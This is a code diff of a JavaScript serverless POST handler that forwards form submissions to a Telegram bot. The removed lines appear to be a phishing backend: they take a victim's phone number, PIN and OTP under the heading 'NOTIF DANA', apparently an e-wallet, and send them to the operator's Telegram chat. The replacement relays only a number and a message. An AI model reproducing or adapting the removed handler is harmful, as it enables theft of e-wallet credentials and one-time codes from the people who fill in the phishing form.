@@ -1,31 +1,22 @@
 export default async function handler(req, res) {
+  if (req.method !== "POST") {
+    return res.status(405).json({ message: "Method not allowed" });
+  }
+
   const token = process.env.BOT_TOKEN;
   const chat_id = process.env.CHAT_ID;
+  const { nomor, pesan } = req.body;
 
-  if (req.method !== 'POST') {
-    return res.status(405).json({ message: 'Method not allowed' });
-  }
+  const text = `NOTIF WEBSITE\n\nNomor: ${nomor || "-"}\nPesan: ${pesan || "-"}`;
 
-  const { nomor, pin, otp } = req.body;
+  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id,
+      text
+    })
+  });
 
-  let text = `📩 NOTIF DANA\n\n`;
-  text += `📱 Nomor: ${nomor}\n`;
-
-  if (pin) text += `🔑 PIN: ${pin}\n`;
-  if (otp) text += `🔐 OTP: ${otp}\n`;
-
-  try {
-    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: chat_id,
-        text: text,
-      }),
-    });
-
-    return res.status(200).json({ status: 'success' });
-  } catch (err) {
-    return res.status(500).json({ status: 'error' });
-  }
+  return res.status(200).json({ status: "ok" });
 }
